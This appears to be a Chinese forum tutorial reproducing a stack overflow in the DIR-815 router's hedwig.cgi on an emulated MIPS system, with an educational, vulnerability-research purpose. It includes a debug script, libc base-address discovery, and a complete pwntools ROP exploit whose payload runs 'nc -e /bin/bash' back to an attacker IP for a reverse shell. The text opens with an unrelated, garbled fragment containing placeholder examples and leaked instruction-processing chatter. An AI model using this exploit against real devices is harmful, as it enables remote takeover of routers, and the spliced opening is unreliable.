
进入`/path/to/xxx`目录，找到`xxx.json`。

在表达式`cvar = avar + bvar`中，加法运算符（`+`）将`avar`与`bvar`相加，得到它们的和`cvar`

在`List.of(arg0, arg1, arg2)`中，`List`接口的工厂方法`of()`接受一系列的元素，返回包含它们的只读列表。

之后我们这样调用`cmd`命令：`cmd arg0 arg1 arg2`。

```
if (condVar > someVal) {console.log("xxx")}
```
[/content]

Wait the instruction says process given text. I mistakenly repeated example. Need process actual text.

Let's redo properly.

[content]
```
#!/bin/bash
export CONTENT_LENGTH="100"
export CONTENT_TYPE="application/x-www-form-urlencoded"
export HTTP_COOKIE=`cat content`    #content你自己构造的数据内容，原本是没有的按上面所述的方式去创建
export REQUEST_METHOD="POST"
export REQUEST_URI="/hedwig.cgi"
echo "uid=1234"|. /gdbserver.mipsel 192.168.x.x:9999 /htdocs/web/hedwig.cgi
```

记得在仿真路由器系统中启动：

```
./debug.sh
```

接下来启动`gdb`调试便可确定偏移。（这里`gdb`调试技能各位同学自己去实践操作吧，本人也在不断熟悉过程中，就不带各位一步一步跟了）

### 4，接下来是确定`libc`的基地址，需要先把环境变量配置好，不然`/htdocs/web/hedwig.cgi`很快就执行完，进程立马就结束了，就得不到`maps`。

利用（注意根据会先`pid`规律，快速修改预测`pid`执行，否则`maps`地址数据不会出来）

```
/htdocs/web/hedwig.cgi & cat /proc/pid/maps
```

**`a&b` 先执行`a`，在执行`b`，无论`a`成功与否都会执行`b`**。因为关闭了地址随机化，`libc.so.0`的基地址就是`0x77f34000`。这里的`libc.so.0`是指向`libuClibc-0.9.30.1.so`。所以`libuClibc-0.9.30.1.so`基地址为`0x77f34000`。

```
root@debian-mipsel:~/squashfs-root#
export CONTENT_LENGTH="100"
root@debian-mipsel:~/squashfs-root#
export CONTENT_TYPE="application/x-www-form-urlencoded"
root@debian-mipsel:~/squashfs-root#
export HTTP_COOKIE="uid=1234"
root@debian-mipsel:~/squashfs-root#
export REQUEST_METHOD="POST"
root@debian-mipsel:~/squashfs-root#
export REQUEST_URI="/hedwig.cgi"
root@debian-mipsel:~/squashfs-root#
/htdocs/web/hedwig.cgi & cat /proc/pid/maps
[10] 1052
cat: /proc/pid/maps: No such file or directory
root@debian-mipsel:~/squashfs-root#
/htdocs/web/hedwig.cgi & cat /proc/pid/maps
[11] 1054
cat: /proc/pid/maps: No such file or directory
[10]+ Stopped /htdocs/web/hedwig.cgi
root@debian-mipsel:~/squashfs-root#
/htdocs/web/hedwig.cgi & cat /proc/1056/maps
[12] 1056
00400000-0041c000 r-xp 00000000 08:01 32694      /htdocs/cgibin
0042c000-0042d000 rw-p 0001c000 08:01 32694      /htdocs/cgibin
0042d000-0042f000 rwxp 00000000 00:00 0          [heap]
77f34000-77f92000 r-xp 00000000 08:01 547906     /lib/libc.so.0
77f92000-77fa1000 ---p 00000000 00:00 0
77fa1000-77fa2000 r--p 0005d000 08:01 547906     /lib/libc.so.0
77fa2000-77fa3000 rw-p 0005e000 08:01 547906     /lib/libc.so.0
77fa3000-77fa8000 rw-p 00000000 00:00 0
77fa8000-77fd1000 r-xp 00000000 08:01 546761     /lib/libgcc_s.so.1
77fd1000-77fe1000 ---p 00000000 00:00 0
77fe1000-77fe2000 rw-p 00029000 08:01 546761     /lib/libgcc_s.so.1
77fe2000-77fe7000 r-xp 00000000 08:01 547907     /lib/ld-uClibc.so.0
77ff5000-77ff6000 rw-p 00000000 00:00 0
77ff6000-77ff7000 r--p 00004000 08:01 547907     /lib/ld-uClibc.so.0
77ff7000-77ff8000 rw-p 00005000 08:01 547907     /lib/ld-uClibc.so.0
7ffd6000-7fff7000 rwxp 00000000 00:00 0          [stack]
7fff7000-7fff8000 r-xp 00000000 00:00 0          [vdso]
[11]+ Stopped /htdocs/web/hedwig.cgi
```

# 编写`exp`

`system`方法：将上面的`exp`的`libc`基地址和偏移改掉然后`cmd`换成`nc -e /bin/bash 192.168.x.145 9999`（IP地址是`ubuntu`机器的，即攻击主机IP）

```
#!/usr/bin/python2
from pwn import *
context.endian = "little"
context.arch = "mips"
base_addr = 0x77f34000
system_addr_1 = 0x53200-1
gadget1 = 0x45988
gadget2 = 0x159cc

cmd = 'nc -e /bin/bash 192.168.79.145 9999'
padding = 'A'*973 #1009-4*9
padding += p32(base_addr + system_addr_1) # s0
padding += p32(base_addr + gadget2) # s1
padding += 'A'*4                        # s2
padding += 'A'*4                        # s3
padding += 'A'*4                        # s4
padding += 'A'*4                           # s5
padding += 'A'*4                        # s6
padding += 'A'*4                        # s7
padding += 'A'*4                        # fp
padding += p32(base_addr + gadget1) # ra
padding += 'B'*0x10
padding += cmd

f = open("context",'wb')
f.write(padding)
f.close()
```

生成的`context`通过`scp`拷贝到`mips`虚拟机中并且`nano debug.sh`更改`debug.sh`

`新的debug.sh内容：（在路由器仿真系统执行，即被攻击机）`

```
#!/bin/bash
export CONTENT_LENGTH="100"
export CONTENT_TYPE="application/x-www-form-urlencoded"
export HTTP_COOKIE=` "uid=`cat context`" `
export REQUEST_METHOD="POST"
export REQUEST_URI="/hedwig.cgi"
echo "uid=1234"|/htdocs/web/hedwig.cgi
#echo "uid=1234"|./gdbserver.mipsel 192.168.x.145:9999 /htdocs/web/hedwig.cgi
```

在`mips`虚拟机运行之后在本机`nc -vlp 9999`，确实能够获取`/bin/bash`权限。成功了！说明`rop`链构造是没问题的。

![图片描述](https://bbs.kanxue.com/upload/attach/202107/913238_UA863HFKQDAN5ZY.png)

`最后：` `exp`当然不止这一种，其他可以利用的方法也许多，由于受限于个人的知识水平，整理难免会出现不正确的地方，如若发现了问题，欢迎指出，笔者也会修改和完善相关内容，继续努力贡献更优质的号文章分享给大家。

# 总结

由于各种原因涉及此行业，也是个人第一个完整复现成功的漏洞，在学习过程中发现许多问题，并且从解决过程中收获许多，正是因为遇到许多奇怪的坑，并且能找的相关资料甚少，所以花了大量时间完成了本文，文中内容尽量做到细节步骤都配图说明，希望能帮助到更多的同学。

`浅聊心态历程：`遇到各种问题被卡住时难免会产生放弃及怀疑的思虑，坚持下来的原因对我而言更多的是热爱，如若不是兴趣趋势，小劝各位同学尽早发现自己喜欢的方向或者职业。

# 参考

1，`DIR815`缓冲区溢出漏洞分析相关：

[129K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3N6i4l9J5P5g2)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3x3U0l9J5x3q4)9J5c8U0l9#2i4K6u0r3x3U0u0Q4x3V1k6V1K9i4t1^5x3e0g2Q4x3X3c8Z5N6h3q4F1i4K6u0V1j5$3S2G2L8X3N6Q4x3X3c8I4N6g2)9J5k6s2W2A6i4K6u0V1j5$3S2#2i4K6u0V1L8r3!0#2i4K6u0V1k6r3!0F1k6#2)9J5k6s2A6S2K9g2)9J5k6r3k6W2L8W2)9J5k6s2S2A6i4K6u0r3](https://bbs.kanxue.com/elink@ccbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3N6i4l9J5P5g2)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3x3U0l9J5x3q4)9J5c8U0l9#2i4K6u0r3x3U0u0Q4x3V1k6V1K9i4t1^5x3e0g2Q4x3X3c8Z5N6h3q4F1i4K6u0V1j5$3S2G2L8X3N6Q4x3X3c8I4N6g2)9J5k6s2W2A6i4K6u0V1j5$3S2#2i4K6u0V1L8r3!0#2i4K6u0V1k6r3!0F1k6#2)9J5k6s2A6S2K9g2)9J5k6r3k6W2L8W2)9J5k6s2S2A6i4K6u0r3)[1]

[e2cK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3N6A6j5h3&6@1j5Y4u0S2L8X3y4Z5i4K6u0W2j5$3&6Q4x3V1j5J5x3o6p5^5i4K6u0r3x3o6g2Q4x3V1j5H3x3#2)9J5c8V1c8Q4x3X3c8x3K9h3&6C8*DIR-815*%E8%B7%AF%E7%94%B1%E5%99%A8%E5%A4%9A%E6%AC%A1%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/](https://bbs.kanxue.com/elink@275K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3N6A6j5h3&6@1j5Y4u0S2L8X3y4Z5i4K6u0W2j5$3&6Q4x3V1j5J5x3o6p5^5i4K6u0r3x3o6g2Q4x3V1j5H3x3#2)9J5c8V1c8Q4x3X3c8x3K9h3&6C8i4K6g2X3c8p5W2d9i4K6u0V1z5o6p5#2i4K6g2X3i4K6t1#2c8e0S2Q4x3U0g2n7y4#2)9J5y4f1q4r3i4K6t1#2c8e0N6Q4x3U0f1&6y4q4)9J5y4f1t1I4i4K6t1#2c8e0g2Q4x3U0f1&6z5g2)9J5y4f1p5^5i4K6t1#2c8e0g2Q4x3U0g2m8y4q4)9J5y4e0W2m8i4K6t1#2c8e0k6Q4x3U0g2m8b7#2)9J5y4f1p5I4i4K6t1#2c8e0k6Q4x3U0g2n7b7g2)9J5y4f1p5J5i4K6t1#2c8e0g2Q4x3U0f1^5y4#2)9J5y4f1u0m8i4K6t1#2c8e0g2Q4x3U0f1^5z5q4)9J5y4e0R3$3i4K6t1#2c8e0k6Q4x3U0f1&6c8g2)9J5y4e0V1H3i4K6u0r3)[2]
